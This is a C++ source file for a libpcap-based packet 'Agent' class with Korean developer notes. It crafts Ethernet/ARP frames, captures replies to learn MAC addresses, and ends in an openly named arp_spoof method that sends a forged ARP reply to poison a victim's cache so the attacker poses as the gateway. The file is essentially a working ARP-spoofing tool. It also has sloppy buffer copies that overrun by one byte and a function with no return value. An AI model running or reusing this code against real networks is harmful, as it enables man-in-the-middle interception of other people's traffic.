#include "agent.h"

Agent::Agent(){
    BZERO(name, MAXNAME);
    BZERO(dev, MAXDEV);
    BZERO(mac, ETH_ALEN);
    BZERO(mac_str, MAXMACSTR);
    BZERO(ip_str, MAXIPSTR);
    BZERO(ip, 4);
}

Agent::Agent(char *name): Agent(){
    strncpy(this->name, name, MAXNAME);
}

Agent::Agent(char *_name, char *_dev) : Agent(_name){
    if(strlen(_dev) > MAXDEV){
        std::cerr << "[X]Error: device name too long" << std::endl;
        exit(-1);
    }

    strcpy(name, _name);
    strcpy(dev, _dev);
    get_dev_info(dev, mac, ip);
    parse_mac(mac, mac_str);
    inet_ntop(AF_INET, ip, ip_str, sizeof(ip_str));
}

Agent::Agent(const Agent &p){
    memcpy(this->name, p.name, MAXNAME+1);
    memcpy(this->dev, p.dev, MAXDEV+1);
    memcpy(this->mac, p.mac, ETH_ALEN+1);
    memcpy(this->mac_str, p.mac_str, MAXMACSTR+1);
    memcpy(this->ip, p.ip, 4+1);
    memcpy(this->ip_str, p.ip_str, MAXIPSTR+1);
}

void Agent::set_mac(pktbyte_n *_mac){
    memcpy(mac, _mac, ETH_ALEN);
    parse_mac(mac, mac_str);
}

void Agent::set_ip_str(char *_ip_str){
    if(strlen(ip_str) > MAXIPSTR){
        std::cerr << "[X]Error: Length of IP is too long" << std::endl;
        exit(-1);
    }

    strcpy(ip_str, _ip_str);
    inet_pton(AF_INET, _ip_str, ip);
}

void Agent::show_info(){
    std::cout << "Agent name: " << this->get_name() << std::endl;
    std::cout << "Agent MAC: " << this->get_mac_str() << std::endl;
    std::cout << "Agent IP: " << this->get_ip_str() << std::endl;
    std::cout << std::endl;
}

int Agent::send(Xpkt *pkt){
    char *dev = this->get_dev();
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    int res;

    if (handle == NULL) {
        std::cerr << "couldn't open device "<< dev << ":" << errbuf << std::endl;
        return -1;
    }

    if(!pcap_inject(handle, pkt->get_pktbuf(), pkt->get_len())){
        pcap_perror(handle, "send: ");
        return -1;
    }

    pcap_close(handle);
    return 0;
}

/* [TODO]
int Agent::dump(char *dev, Xpkt *pkt, bool (*callback)(pktbyte *pkt)){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL) {
        std::cerr << "couldn't open device "<< dev << ":" << errbuf << std::endl;
        return -1;
    }

    while(true){
        struct pcap_pkthdr *header;

        pktbyte *pkt;
        int res = pcap_next_ex(handle, &header, &pkt);
        if(res == 0) continue;
        if(res == -1 || res == -2) break;

        if(filter && filter(pkt)) 
            break;
    }

    return 0;
}
*/

/*  
    Name: snatch
    Namespace: Agent
    Type: Method
    Args: 
        Xpkt *xpkt: filtered packet
        bool (*filter)(pktbyte_n *pkt): filtering callback function 
    Description:
        Snatch the filtered packet
    Note:
        -   인자들을 수정하고, 함수의 일부를 수정해서 정해진 시간동안
            필터링된 패킷들을 벡터로 전부 반환하게 하면 전반듯인
            안정성이 개선될듯
*/
void Agent::snatch(Xpkt *xpkt, bool (*filter)(pktbyte_n *pkt)){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL) {
        std::cerr << "couldn't open device "<< dev << ":" << errbuf << std::endl;
        exit(-1);
    }

    if (filter == nullptr){
        std::cerr << "filter function is required" <<std::endl;
        exit(-1);
    }

    while(true){
        struct pcap_pkthdr *header;
        const pktbyte_n *packet;
        int res = pcap_next_ex(handle, &header, &packet);

        if(res == 0) continue;
        if(res == -1 || res == -2) break;

        if(filter(const_cast<pktbyte_n *>(packet))){
            xpkt->set_pktbuf(const_cast<pktbyte_n *>(packet), header->len);
            break;
        }
    }

    pcap_close(handle);
}

/*  
    Name: arp_send_req
    Namespace: Agent
    Type: Method
    Args: 
        Agent *target: Target of ARP request
    Description:
        Broadcast normal ARP request
*/
void Agent::arp_send_req(Agent *target){
    char *dev = this->get_dev();
    pktbyte_n *src_mac = this->get_mac();
    pktbyte_n *src_ip = this->get_ip();
    pktbyte_n *target_ip = target->get_ip();

    // Set destination mac of ethernet frame as broadcast(FF:FF:FF:FF:FF:FF)
    pktbyte_n eth_dst[ETH_ALEN];
    memset(eth_dst, 0xff, ETH_ALEN);        

    // Set target hardware address of ARP header as NULL
    pktbyte_n arp_tha[ETH_ALEN];
    BZERO(arp_tha, ETH_ALEN);

    Ether ethhdr = Ether(eth_dst, src_mac, ETH_P_ARP);
    Arp arp = Arp(ARPOP_REQUEST, src_mac, src_ip, arp_tha, target_ip);

    Xpkt pkt = ethhdr / arp;

    if(Agent::send(&pkt)){
        std::cerr << "[X]Error occured while sending packet" << std::endl;
        std::cerr << "[packet]" << std::endl;
        pkt.hexdump(ALL);
    }
}


/*  
    Name: arp_send_raw
    Namespace: Agent
    Type: Method
    Args: 
        pktword_h op
        pktbyte_n *sha
        pktbyte_n *sip
        pktbyte_n *tha
        pktbyte_n *tip
    Description:
        Send ARP packet in fully low level.
*/
int Agent::arp_send_raw(
    pktword_h op, 
    pktbyte_n *sha, 
    pktbyte_n *sip, 
    pktbyte_n *tha, 
    pktbyte_n *tip
){
    Ether ethhdr = Ether(tha, sha, ETH_P_ARP);
    Arp arp = Arp(op, sha, sip, tha, tip);

    Xpkt pkt = ethhdr / arp;

    if(Agent::send(&pkt)){
        std::cerr << "[X]Error occured while sending packet" << std::endl;
        std::cerr << "[packet]" << std::endl;
        pkt.hexdump(ALL);
    }
}

/*
    Name: arp_get_target_mac
    Namespace: Agent
    Type: Method
    Args:
        Agent *target
    Description:
        Using ARP protocol, get MAC address of target IP address.
    Note:
        -   snatch된 패킷이 정확히 target에 관한 arp reply인지 확신할 수 없음
            snatch함수 자체에 타임아웃을 부여함고, 제한시간동안 캡쳐된 패킷들을 vector로 반환하고,
            반환된 arp vector에 대해 탐색하면서, 원하는 reply를 선별하도록 하면 보다 안정적으로 개선 가능할듯
        -   ARP request가 항상 성공하는 것이 아니므로 이에 관한 처리가 필요함
*/
int Agent::arp_get_target_mac(Agent *target){
    Xpkt xpkt = Xpkt();
    char *target_dev = target->get_dev();
    char *target_ip_str = target->get_ip_str();
    char *target_mac_str = nullptr;

    std::thread snatcher(&Agent::snatch, this, &xpkt, filter_arp_reply);

    usleep(300); // Wait little for snatcher to be ready

    std::cout << "[ARP / Get mac address]" << std::endl;
    std::cout << "Target IP: " << target_ip_str << std::endl;

    Agent::arp_send_req(target);
    snatcher.join();

    Arp arp = Arp(xpkt);
    target->set_mac(arp.get_sha());

    target_mac_str = target->get_mac_str();

    std::ios_base::fmtflags f( std::cout.flags() );

    std::cout << "Result: " << std::endl;
    std::cout.setf(std::ios_base::left);
    std::cout << std::setw(MAXIPSTR+3) << "IP" << std::setw(MAXMACSTR) << "MAC" << std::endl;
    std::cout << std::setw(MAXIPSTR+3) << target_ip_str << std::setw(MAXMACSTR) << target_mac_str << std::endl;
    std::cout << std::endl;

    std::cout.flags(f);

    return true;
}

/*
    Name: arp_spoof
    Namespace: Agent
    Type: Method
    Args:
        Agent *sender: Victim of attack
        Agent *target: Usually gateway of sender. Attacker would pretend to be it.
    Description:
        Do ARP spoof attack
    Note:
        Error handling
*/
int Agent::arp_spoof(Agent *sender, Agent *target){
    pktbyte_n *sender_mac = sender->get_mac();
    char *sender_mac_str = sender->get_mac_str();
    char *target_ip_str = target->get_ip_str();
    char *attker_mac_str = this->get_mac_str();

    Agent::arp_get_target_mac(sender);

    std::cout <<"[ARP / ARP spoof]" << std::endl;
    std::cout << "Sender MAC: " << sender_mac_str << std::endl;
    std::cout << "Target IP: " << target_ip_str << std::endl;
    std::cout << "Your MAC: " << attker_mac_str << std::endl;
    std::cout << std::endl;

    Agent::arp_send_raw(
        ARPOP_REPLY,            // op
        this->get_mac(),       // sha
        target->get_ip(),       // sip
        sender->get_mac(),      // tha
        sender->get_ip()        // tip
    );

    return true;
}